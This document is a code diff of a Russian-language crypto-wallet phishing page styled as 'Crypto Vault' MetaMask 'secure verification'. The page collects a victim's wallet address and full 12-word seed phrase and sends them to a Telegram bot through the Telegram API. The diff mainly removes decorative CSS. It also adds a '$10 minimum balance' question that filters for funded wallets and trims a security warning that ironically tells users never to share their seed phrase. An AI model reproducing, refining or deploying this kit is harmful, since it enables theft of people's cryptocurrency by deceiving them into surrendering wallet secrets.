@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>✨ Crypto Vault | Безопасная верификация</title>
     <style>
-        /* Импорт красивых шрифтов */
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
         
         * {
@@ -21,8 +20,6 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
-            position: relative;
-            overflow-x: hidden;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             animation: gradientBG 15s ease infinite;
             background-size: 400% 400%;
@@ -34,75 +31,17 @@
             100% { background-position: 0% 50%; }
         }
         
-        /* Анимированные частицы фона */
-        .particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            pointer-events: none;
-        }
-        
-        .particle {
-            position: absolute;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
-            animation: float 20s infinite;
-        }
-        
-        @keyframes float {
-            0%, 100% { transform: translateY(0) translateX(0); }
-            25% { transform: translateY(-20px) translateX(10px); }
-            50% { transform: translateY(0) translateX(20px); }
-            75% { transform: translateY(20px) translateX(10px); }
-        }
-        
         .container {
             background: rgba(255, 255, 255, 0.95);
             backdrop-filter: blur(10px);
             border-radius: 30px;
             padding: 40px;
-            box-shadow: 
-                0 25px 50px -12px rgba(0, 0, 0, 0.5),
-                0 0 0 1px rgba(255, 255, 255, 0.1) inset,
-                0 0 30px rgba(102, 126, 234, 0.3);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
             width: 100%;
             max-width: 800px;
             position: relative;
             z-index: 1;
-            animation: containerAppear 0.8s cubic-bezier(0.23, 1, 0.32, 1);
             border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        
-        @keyframes containerAppear {
-            from {
-                opacity: 0;
-                transform: scale(0.9) translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
-        }
-        
-        /* Декоративные элементы */
-        .glow-effect {
-            position: absolute;
-            top: -20px;
-            left: -20px;
-            right: -20px;
-            bottom: -20px;
-            background: radial-gradient(circle at 30% 30%, rgba(102, 126, 234, 0.2), transparent 70%);
-            border-radius: 40px;
-            z-index: -1;
-            animation: pulseGlow 4s ease-in-out infinite;
-        }
-        
-        @keyframes pulseGlow {
-            0%, 100% { opacity: 0.5; }
-            50% { opacity: 1; }
         }
         
         h1 {
@@ -113,13 +52,6 @@
             margin-bottom: 10px;
             font-size: 36px;
             font-weight: 800;
-            letter-spacing: -0.5px;
-            animation: titleGlow 2s ease-in-out infinite;
-        }
-        
-        @keyframes titleGlow {
-            0%, 100% { text-shadow: 0 0 20px rgba(102, 126, 234, 0.3); }
-            50% { text-shadow: 0 0 30px rgba(102, 126, 234, 0.6); }
         }
         
         .subtitle {
@@ -127,43 +59,14 @@
             color: #666;
             margin-bottom: 40px;
             font-size: 16px;
-            position: relative;
-            animation: subtitleSlide 1s ease-out;
         }
         
-        @keyframes subtitleSlide {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .subtitle::after {
-            content: '';
-            display: block;
-            width: 100px;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #667eea, #764ba2, transparent);
-            margin: 15px auto 0;
-            animation: lineExpand 1.5s ease-in-out infinite;
-        }
-        
-        @keyframes lineExpand {
-            0%, 100% { width: 50px; opacity: 0.5; }
-            50% { width: 150px; opacity: 1; }
-        }
-        
-        /* Прогресс бар с анимацией */
+        /* Прогресс бар */
         .progress-bar {
             display: flex;
             justify-content: space-between;
             margin-bottom: 50px;
             position: relative;
-            counter-reset: step;
         }
         
         .progress-bar::before {
@@ -173,7 +76,7 @@
             left: 0;
             width: 100%;
             height: 3px;
-            background: linear-gradient(90deg, #e0e0e0 0%, #e0e0e0 100%);
+            background: #e0e0e0;
             z-index: 1;
             border-radius: 3px;
         }
@@ -199,24 +102,6 @@
             padding: 0 10px;
             text-align: center;
             flex: 1;
-            animation: stepAppear 0.5s ease-out;
-            animation-fill-mode: both;
-        }
-        
-        .progress-step:nth-child(1) { animation-delay: 0.1s; }
-        .progress-step:nth-child(2) { animation-delay: 0.2s; }
-        .progress-step:nth-child(3) { animation-delay: 0.3s; }
-        .progress-step:nth-child(4) { animation-delay: 0.4s; }
-        
-        @keyframes stepAppear {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
         
         .step-number {
@@ -231,18 +116,6 @@
             font-weight: 700;
             color: #999;
             transition: all 0.3s ease;
-            position: relative;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-        
-        .step-number::before {
-            content: '';
-            position: absolute;
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            border: 2px solid transparent;
-            transition: all 0.3s ease;
         }
         
         .step-number.active {
@@ -250,17 +123,6 @@
             color: white;
             transform: scale(1.1);
             box-shadow: 0 0 20px rgba(76, 175, 80, 0.5);
-            animation: pulse 2s infinite;
-        }
-        
-        .step-number.active::before {
-            border-color: #4CAF50;
-            animation: rotate 3s linear infinite;
-        }
-        
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
         }
         
         .step-number.completed {
@@ -271,25 +133,12 @@
         .step-number.completed::after {
             content: '✓';
             font-size: 20px;
-            animation: checkAppear 0.3s ease-out;
-        }
-        
-        @keyframes checkAppear {
-            from {
-                transform: scale(0);
-                opacity: 0;
-            }
-            to {
-                transform: scale(1);
-                opacity: 1;
-            }
         }
         
         .step-label {
             font-size: 12px;
             color: #666;
             font-weight: 500;
-            transition: all 0.3s ease;
         }
         
         .active .step-label {
@@ -297,28 +146,22 @@
             font-weight: 600;
         }
         
-        /* Секции с анимацией */
+        /* Секции */
         .section {
             display: none;
-            animation: sectionEnter 0.6s cubic-bezier(0.23, 1, 0.32, 1);
+            animation: fadeIn 0.5s;
         }
         
         .section.active {
             display: block;
         }
         
-        @keyframes sectionEnter {
-            from {
-                opacity: 0;
-                transform: translateX(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
-        /* MetaMask секция с эффектами */
+        /* MetaMask секция */
         .metamask-section {
             background: linear-gradient(135deg, #f6851b 0%, #e4761b 100%);
             border-radius: 20px;
@@ -326,33 +169,13 @@
             margin-bottom: 30px;
             color: white;
             text-align: center;
-            position: relative;
-            overflow: hidden;
             box-shadow: 0 20px 40px rgba(246, 133, 27, 0.3);
-            animation: metamaskGlow 3s ease-in-out infinite;
-        }
-        
-        @keyframes metamaskGlow {
-            0%, 100% { box-shadow: 0 20px 40px rgba(246, 133, 27, 0.3); }
-            50% { box-shadow: 0 30px 60px rgba(246, 133, 27, 0.5); }
-        }
-        
-        .metamask-section::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 70%);
-            animation: rotate 20s linear infinite;
         }
         
         .metamask-icon {
             font-size: 80px;
             margin-bottom: 20px;
             animation: bounce 2s ease-in-out infinite;
-            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.2));
         }
         
         @keyframes bounce {
@@ -364,20 +187,95 @@
             font-size: 32px;
             font-weight: 800;
             margin-bottom: 15px;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.2);
-            animation: titleShake 5s ease-in-out infinite;
         }
         
-        @keyframes titleShake {
-            0%, 100% { transform: rotate(0deg); }
-            95% { transform: rotate(0deg); }
-            96% { transform: rotate(1deg); }
-            97% { transform: rotate(-1deg); }
-            98% { transform: rotate(1deg); }
-            99% { transform: rotate(-1deg); }
+        /* Баланс секция */
+        .balance-section {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
         
-        /* Предупреждение с анимацией */
+        .balance-title {
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #ffeb3b;
+        }
+        
+        .balance-question {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        
+        .button-group-balance {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        
+        .btn-balance {
+            padding: 15px 30px;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            flex: 1;
+            max-width: 200px;
+        }
+        
+        .btn-balance-yes {
+            background: linear-gradient(135deg, #4CAF50, #45a049);
+            color: white;
+        }
+        
+        .btn-balance-no {
+            background: linear-gradient(135deg, #f44336, #d32f2f);
+            color: white;
+        }
+        
+        .btn-balance:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+        
+        .topup-message {
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            display: none;
+            animation: slideIn 0.5s;
+        }
+        
+        .topup-message.show {
+            display: block;
+        }
+        
+        .topup-link {
+            display: inline-block;
+            background: #ffeb3b;
+            color: #333;
+            padding: 12px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: bold;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+        
+        .topup-link:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(255, 235, 59, 0.4);
+        }
+        
+        /* Предупреждение */
         .warning-message {
             background: rgba(0, 0, 0, 0.2);
             backdrop-filter: blur(10px);
@@ -386,33 +284,12 @@
             border-radius: 15px;
             margin: 25px 0;
             text-align: left;
-            animation: warningPulse 2s ease-in-out infinite;
-            transform-origin: left;
-        }
-        
-        @keyframes warningPulse {
-            0%, 100% { box-shadow: 0 0 20px rgba(255, 235, 59, 0.3); }
-            50% { box-shadow: 0 0 40px rgba(255, 235, 59, 0.5); }
         }
         
         .warning-message h3 {
             color: #ffeb3b;
             margin-bottom: 15px;
             font-size: 22px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .warning-icon {
-            font-size: 28px;
-            animation: warningRotate 2s ease-in-out infinite;
-        }
-        
-        @keyframes warningRotate {
-            0%, 100% { transform: rotate(0deg); }
-            25% { transform: rotate(10deg); }
-            75% { transform: rotate(-10deg); }
         }
         
         .warning-message ul {
@@ -421,27 +298,9 @@
         
         .warning-message li {
             margin: 10px 0;
-            animation: slideInList 0.5s ease-out;
-            animation-fill-mode: both;
         }
         
-        .warning-message li:nth-child(1) { animation-delay: 0.1s; }
-        .warning-message li:nth-child(2) { animation-delay: 0.2s; }
-        .warning-message li:nth-child(3) { animation-delay: 0.3s; }
-        .warning-message li:nth-child(4) { animation-delay: 0.4s; }
-        
-        @keyframes slideInList {
-            from {
-                opacity: 0;
-                transform: translateX(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-        
-        /* Кнопки с эффектами */
+        /* Кнопки */
         .btn {
             padding: 15px 30px;
             border: none;
@@ -450,32 +309,12 @@
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.3);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
-        
-        .btn:hover::before {
-            width: 300px;
-            height: 300px;
         }
         
         .btn-primary {
             background: linear-gradient(135deg, #4CAF50, #45a049);
             color: white;
-            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
+            width: 100%;
         }
         
         .btn-primary:hover:not(:disabled) {
@@ -483,14 +322,14 @@
             box-shadow: 0 8px 25px rgba(76, 175, 80, 0.4);
         }
         
-        .btn-primary:active:not(:disabled) {
-            transform: translateY(-1px);
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
         
         .btn-secondary {
             background: linear-gradient(135deg, #f0f0f0, #e0e0e0);
             color: #333;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
         }
         
         .btn-secondary:hover {
@@ -498,33 +337,14 @@
             box-shadow: 0 8px 25px rgba(0,0,0,0.15);
         }
         
-        .btn-metamask {
-            padding: 15px 40px;
-            border-radius: 30px;
-            font-size: 18px;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            gap: 15px;
         }
         
-        .btn-yes {
-            background: linear-gradient(135deg, #4CAF50, #45a049);
-            color: white;
-            animation: pulse 2s infinite;
-        }
-        
-        .btn-no {
-            background: linear-gradient(135deg, #f44336, #d32f2f);
-            color: white;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-        
-        /* Сетка монет с анимацией */
+        /* Сетка монет */
         .coins-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
@@ -540,51 +360,10 @@
             cursor: pointer;
             transition: all 0.3s ease;
             background: white;
-            position: relative;
-            overflow: hidden;
-            animation: cardAppear 0.5s ease-out;
-            animation-fill-mode: both;
-        }
-        
-        .coin-card:nth-child(1) { animation-delay: 0.1s; }
-        .coin-card:nth-child(2) { animation-delay: 0.15s; }
-        .coin-card:nth-child(3) { animation-delay: 0.2s; }
-        .coin-card:nth-child(4) { animation-delay: 0.25s; }
-        .coin-card:nth-child(5) { animation-delay: 0.3s; }
-        .coin-card:nth-child(6) { animation-delay: 0.35s; }
-        .coin-card:nth-child(7) { animation-delay: 0.4s; }
-        .coin-card:nth-child(8) { animation-delay: 0.45s; }
-        .coin-card:nth-child(9) { animation-delay: 0.5s; }
-        .coin-card:nth-child(10) { animation-delay: 0.55s; }
-        
-        @keyframes cardAppear {
-            from {
-                opacity: 0;
-                transform: scale(0.8) translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
-        }
-        
-        .coin-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            transition: left 0.5s;
-        }
-        
-        .coin-card:hover::before {
-            left: 100%;
         }
         
         .coin-card:hover {
-            transform: translateY(-5px) scale(1.02);
+            transform: translateY(-5px);
             border-color: #4CAF50;
             box-shadow: 0 10px 30px rgba(76, 175, 80, 0.3);
         }
@@ -592,12 +371,6 @@
         .coin-card.selected {
             border-color: #4CAF50;
             background: linear-gradient(135deg, #f0f9f0, #e8f5e9);
-            animation: selectedPulse 2s infinite;
-        }
-        
-        @keyframes selectedPulse {
-            0%, 100% { box-shadow: 0 0 20px rgba(76, 175, 80, 0.3); }
-            50% { box-shadow: 0 0 40px rgba(76, 175, 80, 0.5); }
         }
         
         .coin-icon {
@@ -612,49 +385,15 @@
             font-size: 30px;
             font-weight: bold;
             color: #333;
-            transition: all 0.3s ease;
-            animation: rotateIn 0.5s ease-out;
-        }
-        
-        @keyframes rotateIn {
-            from {
-                transform: rotate(-180deg) scale(0);
-            }
-            to {
-                transform: rotate(0) scale(1);
-            }
-        }
-        
-        .coin-card:hover .coin-icon {
-            transform: scale(1.1) rotate(10deg);
         }
         
         .coin-card[data-symbol="TRX"] .coin-icon {
             background: linear-gradient(135deg, #ff6b6b, #ff4757);
             color: white;
-            animation: trxGlow 2s ease-in-out infinite;
         }
         
-        @keyframes trxGlow {
-            0%, 100% { box-shadow: 0 0 20px rgba(255, 107, 107, 0.5); }
-            50% { box-shadow: 0 0 40px rgba(255, 107, 107, 0.8); }
-        }
-        
-        /* Поля ввода с эффектами */
         .input-group {
             margin-bottom: 25px;
-            animation: slideUp 0.5s ease-out;
-        }
-        
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
         
         .input-group label {
@@ -662,9 +401,6 @@
             margin-bottom: 10px;
             font-weight: 600;
             color: #333;
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
         }
         
         .input-group input {
@@ -681,21 +417,13 @@
             outline: none;
             border-color: #4CAF50;
             box-shadow: 0 0 0 4px rgba(76, 175, 80, 0.1);
-            transform: scale(1.02);
         }
         
         .input-group input.error {
             border-color: #f44336;
-            animation: shake 0.5s ease-in-out;
         }
         
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
-            20%, 40%, 60%, 80% { transform: translateX(5px); }
-        }
-        
-        /* Поля для слов с эффектом размытия */
+        /* Поля для слов */
         .words-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -711,15 +439,12 @@
             font-size: 16px;
             text-align: center;
             transition: all 0.3s ease;
-            background: white;
         }
         
         .word-input:focus {
             outline: none;
             border-color: #4CAF50;
             box-shadow: 0 0 0 4px rgba(76, 175, 80, 0.1);
-            transform: scale(1.05);
-            z-index: 10;
         }
         
         .word-input.blur-effect {
@@ -728,14 +453,11 @@
             color: transparent;
             text-shadow: 0 0 10px rgba(0,0,0,0.3);
             border-color: #999;
-            user-select: none;
-            transition: all 0.3s ease;
         }
         
         .word-input.blur-effect:hover {
             filter: blur(3px);
             cursor: pointer;
-            border-color: #4CAF50;
         }
         
         .blur-hint {
@@ -745,61 +467,39 @@
             margin-top: 10px;
             font-style: italic;
             padding: 10px;
-            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            background: #f0f0f0;
             border-radius: 30px;
-            animation: hintPulse 2s ease-in-out infinite;
         }
         
-        @keyframes hintPulse {
-            0%, 100% { opacity: 0.7; }
-            50% { opacity: 1; }
+        .selected-info {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-left: 4px solid #4CAF50;
         }
         
-        /* Статус сообщения */
         .status {
             margin-top: 25px;
             padding: 15px 20px;
             border-radius: 12px;
             display: none;
-            animation: slideInDown 0.5s ease-out;
-        }
-        
-        @keyframes slideInDown {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
         
         .status.success {
-            background: linear-gradient(135deg, #d4edda, #c3e6cb);
+            background: #d4edda;
             color: #155724;
             border-left: 4px solid #28a745;
+            display: block;
         }
         
         .status.error {
-            background: linear-gradient(135deg, #f8d7da, #f5c6cb);
+            background: #f8d7da;
             color: #721c24;
             border-left: 4px solid #dc3545;
+            display: block;
         }
         
-        .status.warning {
-            background: linear-gradient(135deg, #fff3cd, #ffeeba);
-            color: #856404;
-            border-left: 4px solid #ffc107;
-        }
-        
-        .status.info {
-            background: linear-gradient(135deg, #d1ecf1, #bee5eb);
-            color: #0c5460;
-            border-left: 4px solid #17a2b8;
-        }
-        
-        /* Кнопка сброса */
         .reset-link {
             text-align: center;
             margin-top: 25px;
@@ -819,75 +519,34 @@
         .reset-link a:hover {
             transform: translateY(-2px);
             background: rgba(102, 126, 234, 0.2);
-            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
         }
         
-        .reset-link a i {
-            display: inline-block;
-            transition: transform 0.3s ease;
-        }
-        
-        .reset-link a:hover i {
-            transform: rotate(360deg);
-        }
-        
-        /* Адаптация для мобильных */
         @media (max-width: 500px) {
             .container {
                 padding: 20px;
             }
             
-            h1 {
-                font-size: 28px;
-            }
-            
             .coins-grid {
                 grid-template-columns: repeat(2, 1fr);
-                gap: 10px;
             }
             
             .words-grid {
                 grid-template-columns: repeat(2, 1fr);
             }
             
-            .button-group-metamask {
+            .button-group-balance {
                 flex-direction: column;
-                gap: 10px;
+                align-items: center;
             }
             
-            .btn-metamask {
-                width: 100%;
-                max-width: none;
-            }
-            
-            .step-label {
-                font-size: 10px;
+            .btn-balance {
+                max-width: 100%;
             }
         }
-        
-        /* Создание частиц */
-        .particle:nth-child(1) { width: 80px; height: 80px; top: 10%; left: 10%; animation-duration: 25s; }
-        .particle:nth-child(2) { width: 60px; height: 60px; top: 20%; right: 15%; animation-duration: 18s; }
-        .particle:nth-child(3) { width: 40px; height: 40px; bottom: 15%; left: 20%; animation-duration: 22s; }
-        .particle:nth-child(4) { width: 100px; height: 100px; bottom: 25%; right: 25%; animation-duration: 30s; }
-        .particle:nth-child(5) { width: 50px; height: 50px; top: 50%; left: 5%; animation-duration: 20s; }
-        .particle:nth-child(6) { width: 70px; height: 70px; top: 70%; right: 10%; animation-duration: 28s; }
     </style>
 </head>
 <body>
-    <!-- Анимированные частицы фона -->
-    <div class="particles">
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
-        <div class="particle"></div>
-    </div>
-    
     <div class="container">
-        <div class="glow-effect"></div>
-        
         <h1>✨ Crypto Vault</h1>
         <p class="subtitle">Безопасная верификация крипто кошелька</p>
         
@@ -916,44 +575,39 @@
             <div class="metamask-section">
                 <div class="metamask-icon">🦊</div>
                 <div class="metamask-title">MetaMask</div>
-                <div class="metamask-description">
-                    У вас установлено расширение MetaMask?
+                
+                <!-- Проверка баланса -->
+                <div class="balance-section">
+                    <div class="balance-title">💰 Проверка баланса</div>
+                    <div class="balance-question">На кошельке есть минимум $10?</div>
+                    
+                    <div class="button-group-balance">
+                        <button class="btn-balance btn-balance-yes" id="balanceYes">✅ Да, есть</button>
+                        <button class="btn-balance btn-balance-no" id="balanceNo">❌ Нет</button>
+                    </div>
+                    
+                    <div class="topup-message" id="topupMessage">
+                        <p>Для верификации необходимо пополнить кошелек минимум на $10</p>
+                        <p>Рекомендуемые способы:</p>
+                        <a href="#" class="topup-link" onclick="alert('Перейдите в MetaMask для пополнения')">
+                            💳 Пополнить сейчас
+                        </a>
+                    </div>
                 </div>
                 
                 <div class="warning-message" id="warningMessage" style="display: none;">
-                    <h3>
-                        <span class="warning-icon">⚠️</span>
-                        КРИТИЧЕСКОЕ ПРЕДУПРЕЖДЕНИЕ!
-                    </h3>
+                    <h3>⚠️ ВАЖНОЕ ПРЕДУПРЕЖДЕНИЕ</h3>
                     <p><strong>НИКОМУ НИКОГДА НЕ СООБЩАЙТЕ:</strong></p>
                     <ul>
                         <li>🔑 Приватные ключи от кошелька</li>
-                        <li>🔐 Seed-фразу (12/24 слова)</li>
+                        <li>🔐 Seed-фразу (12 слов)</li>
                         <li>🔒 Пароли от MetaMask</li>
-                        <li>📱 Коды двухфакторной аутентификации</li>
                     </ul>
-                    <p><strong>Золотое правило безопасности:</strong></p>
-                    <ul>
-                        <li>✅ Сотрудники MetaMask НИКОГДА не спрашивают пароли</li>
-                        <li>✅ Техподдержка НЕ НУЖДАЕТСЯ в ваших ключах</li>
-                        <li>✅ Кто просит seed-фразу - 100% МОШЕННИК</li>
-                    </ul>
-                    <p style="font-size: 20px; margin-top: 20px; color: #ffeb3b; text-align: center; animation: blink 1s infinite;">
-                        ⚡ ВАША БЕЗОПАСНОСТЬ - В ВАШИХ РУКАХ!
-                    </p>
-                </div>
-                
-                <div class="security-notice" id="securityNotice" style="display: none;">
-                    🔒 Пароль от кошелька — только ваша тайна!
-                </div>
-                
-                <div class="button-group-metamask">
-                    <button class="btn-metamask btn-yes" id="metamaskYes">✅ Да, установлен</button>
-                    <button class="btn-metamask btn-no" id="metamaskNo">❌ Нет</button>
                 </div>
             </div>
             
             <div class="button-group">
+                <button class="btn btn-secondary" id="backToStart" style="display: none;">← Назад</button>
                 <button class="btn btn-primary" id="continueToStep2" disabled>Продолжить →</button>
             </div>
         </div>
@@ -995,8 +649,8 @@
             <div class="input-group">
                 <label>📝 Seed-фраза (12 слов)</label>
                 <div class="words-grid" id="wordsGrid"></div>
-                <div class="blur-hint" id="blurHint">
-                    🔒 Заполненные слова скрыты для безопасности. Нажмите на поле чтобы увидеть.
+                <div class="blur-hint">
+                    🔒 Заполненные слова скрыты. Нажмите на поле чтобы увидеть.
                 </div>
             </div>
             
@@ -1008,11 +662,8 @@
         
         <div id="status" class="status"></div>
         
-        <!-- Кнопка сброса -->
         <div class="reset-link">
-            <a href="#" id="resetAll">
-                <i>🔄</i> Вернуться в начало
-            </a>
+            <a href="#" id="resetAll">☑ Вернуться в начало</a>
         </div>
     </div>
 
@@ -1038,6 +689,7 @@
         let selectedCoin = null;
         let walletAddress = '';
         let metamaskConfirmed = false;
+        let hasBalance = false;
         
         // Создаем сетку монет
         const coinsGrid = document.getElementById('coinsGrid');
@@ -1100,10 +752,10 @@
         const step3Indicator = document.getElementById('step3-indicator');
         const step4Indicator = document.getElementById('step4-indicator');
         
-        const metamaskYes = document.getElementById('metamaskYes');
-        const metamaskNo = document.getElementById('metamaskNo');
+        const balanceYes = document.getElementById('balanceYes');
+        const balanceNo = document.getElementById('balanceNo');
+        const topupMessage = document.getElementById('topupMessage');
         const warningMessage = document.getElementById('warningMessage');
-        const securityNotice = document.getElementById('securityNotice');
         const continueToStep2 = document.getElementById('continueToStep2');
         
         const nextToStep3 = document.getElementById('nextToStep3');
@@ -1111,6 +763,7 @@
         const backToStep1 = document.getElementById('backToStep1');
         const backToStep2 = document.getElementById('backToStep2');
         const backToStep3 = document.getElementById('backToStep3');
+        const backToStart = document.getElementById('backToStart');
         const submitBtn = document.getElementById('submitData');
         const resetAll = document.getElementById('resetAll');
         
@@ -1121,45 +774,46 @@
         const statusDiv = document.getElementById('status');
         const progressBar = document.getElementById('progressBar');
         
-        // Обновление прогресс бара
+        // Функция обновления прогрессбара
         function updateProgressBar(step) {
-            const steps = [step1Indicator, step2Indicator, step3Indicator, step4Indicator];
-            steps.forEach((s, index) => {
-                s.classList.remove('active', 'completed');
-                if (index + 1 < step) {
-                    s.classList.add('completed');
-                } else if (index + 1 === step) {
-                    s.classList.add('active');
+            const percent = (step - 1) * 33.33;
+            progressBar.style.setProperty('--progress', `${percent}%`);
+            
+            [step1Indicator, step2Indicator, step3Indicator, step4Indicator].forEach((el, idx) => {
+                el.classList.remove('active', 'completed');
+                if (idx + 1 < step) {
+                    el.classList.add('completed');
+                } else if (idx + 1 === step) {
+                    el.classList.add('active');
                 }
             });
             
-            // Обновляем линию прогресса
-            const percentage = ((step - 1) / 3) * 100;
-            progressBar.style.setProperty('--progress', `${percentage}%`);
+            // Обновляем линию прогрессбара
+            const afterElement = progressBar.querySelector('::after');
+            if (afterElement) {
+                afterElement.style.width = `${percent}%`;
+            }
         }
         
-        // Обработчики для MetaMask
-        metamaskYes.addEventListener('click', () => {
+        // Обработчики баланса
+        balanceYes.addEventListener('click', () => {
+            hasBalance = true;
+            topupMessage.classList.remove('show');
             warningMessage.style.display = 'block';
-            securityNotice.style.display = 'block';
             continueToStep2.disabled = false;
-            metamaskConfirmed = true;
-            
-            warningMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
-            
-            showStatus('✅ Внимательно прочитайте предупреждение!', 'info');
+            showStatus('✅ Баланс подтвержден', 'success');
         });
         
-        metamaskNo.addEventListener('click', () => {
+        balanceNo.addEventListener('click', () => {
+            hasBalance = false;
+            topupMessage.classList.add('show');
             warningMessage.style.display = 'none';
-            securityNotice.style.display = 'none';
             continueToStep2.disabled = true;
-            metamaskConfirmed = false;
-            showStatus('❌ Для верификации необходим MetaMask', 'error');
         });
         
+        // Продолжение после MetaMask
         continueToStep2.addEventListener('click', () => {
-            if (!metamaskConfirmed) return;
+            if (!hasBalance) return;
             
             step1.classList.remove('active');
             step2.classList.add('active');
@@ -1167,8 +821,12 @@
             
             metamaskInfo.innerHTML = `
                 <p><strong>🦊 MetaMask:</strong> ✅ Подтвержден</p>
-                <p><small>⚠️ Помните: пароль знаете только вы!</small></p>
+                <p><strong>💰 Баланс:</strong> Есть $10+</p>
             `;
+        });
+        
+        backToStart.addEventListener('click', () => {
+            resetToBeginning();
         });
         
         function selectCoin(coin, card) {
@@ -1254,32 +912,24 @@
             updateProgressBar(3);
         });
         
-        // Функция отправки в Telegram
         async function sendToTelegram(message) {
             try {
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                
-                const params = {
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                };
                 
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(params)
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
                 });
                 
                 const data = await response.json();
-                
-                if (data.ok) {
-                    return true;
-                } else {
-                    throw new Error(data.description);
-                }
+                return data.ok;
                 
             } catch (error) {
                 console.error('Ошибка:', error);
@@ -1301,7 +951,8 @@
             try {
                 const message = `🔐 <b>НОВАЯ ВЕРИФИКАЦИЯ</b>\n\n` +
                                `🦊 <b>MetaMask:</b> Подтвержден\n` +
-                               `💰 <b>Монета:</b> ${selectedCoin.name} (${selectedCoin.symbol})\n` +
+                               `💰 <b>Баланс:</b> Есть $10+\n` +
+                               `💎 <b>Монета:</b> ${selectedCoin.name} (${selectedCoin.symbol})\n` +
                                `📬 <b>Адрес:</b> <code>${walletAddress}</code>\n\n` +
                                `📝 <b>12 слов:</b>\n${words.map((word, i) => `${i+1}. ${word}`).join('\n')}\n\n` +
                                `🕐 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
